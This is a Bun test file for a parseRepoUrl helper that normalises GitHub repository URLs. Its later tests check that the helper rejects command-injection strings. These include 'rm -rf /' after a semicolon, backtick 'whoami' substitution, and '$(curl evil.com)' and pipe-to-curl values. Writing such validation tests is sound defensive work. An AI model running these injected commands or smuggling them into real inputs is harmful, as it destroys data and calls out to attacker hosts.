import { describe, expect, test } from "bun:test";
import { parseRepoUrl } from "$lib/server/pipeline/git.js";

describe("parseRepoUrl", () => {
	test("parses full HTTPS URL", () => {
		const result = parseRepoUrl("https://github.com/facebook/react");
		expect(result).toEqual({
			owner: "facebook",
			name: "react",
			url: "https://github.com/facebook/react",
			isLocal: false,
		});
	});

	test("parses URL with .git suffix", () => {
		const result = parseRepoUrl("https://github.com/facebook/react.git");
		expect(result).toEqual({
			owner: "facebook",
			name: "react",
			url: "https://github.com/facebook/react",
			isLocal: false,
		});
	});

	test("parses URL without protocol", () => {
		const result = parseRepoUrl("github.com/facebook/react");
		expect(result).toEqual({
			owner: "facebook",
			name: "react",
			url: "https://github.com/facebook/react",
			isLocal: false,
		});
	});

	test("parses short owner/repo format", () => {
		const result = parseRepoUrl("facebook/react");
		expect(result).toEqual({
			owner: "facebook",
			name: "react",
			url: "https://github.com/facebook/react",
			isLocal: false,
		});
	});

	test("trims whitespace", () => {
		const result = parseRepoUrl("  facebook/react  ");
		expect(result.owner).toBe("facebook");
		expect(result.name).toBe("react");
	});

	test("strips trailing slash", () => {
		const result = parseRepoUrl("https://github.com/facebook/react/");
		expect(result.name).toBe("react");
	});

	test("throws on invalid input", () => {
		expect(() => parseRepoUrl("not-a-url")).toThrow("Invalid repository URL");
	});

	test("throws on empty string", () => {
		expect(() => parseRepoUrl("")).toThrow("Invalid repository URL");
	});

	test("rejects semicolon command injection in owner", () => {
		expect(() => parseRepoUrl(";rm -rf //repo")).toThrow("Invalid repository URL");
	});

	test("rejects semicolon command injection in name", () => {
		expect(() => parseRepoUrl("owner/;rm -rf /")).toThrow("Invalid repository URL");
	});

	test("rejects backtick substitution in owner", () => {
		expect(() => parseRepoUrl("`whoami`/repo")).toThrow("Invalid repository URL");
	});

	test("rejects $() substitution in name", () => {
		expect(() => parseRepoUrl("owner/$(curl evil.com)")).toThrow("Invalid repository URL");
	});

	test("rejects pipe in owner", () => {
		expect(() => parseRepoUrl("owner|curl evil.com/repo")).toThrow("Invalid repository URL");
	});

	test("rejects ampersand in name", () => {
		expect(() => parseRepoUrl("owner/repo&rm -rf")).toThrow("Invalid repository URL");
	});

	test("rejects spaces in owner via full URL", () => {
		expect(() => parseRepoUrl("https://github.com/own er/repo")).toThrow("Invalid repository URL");
	});

	test("rejects shell chars in full URL owner", () => {
		expect(() => parseRepoUrl("https://github.com/;evil/repo")).toThrow("Invalid repository URL");
	});

	test("rejects shell chars in full URL name", () => {
		expect(() => parseRepoUrl("https://github.com/owner/$(evil)")).toThrow(
			"Invalid repository URL",
		);
	});

	test("allows hyphens, dots, and underscores", () => {
		const result = parseRepoUrl("my-org/my_repo.js");
		expect(result.owner).toBe("my-org");
		expect(result.name).toBe("my_repo.js");
	});
});
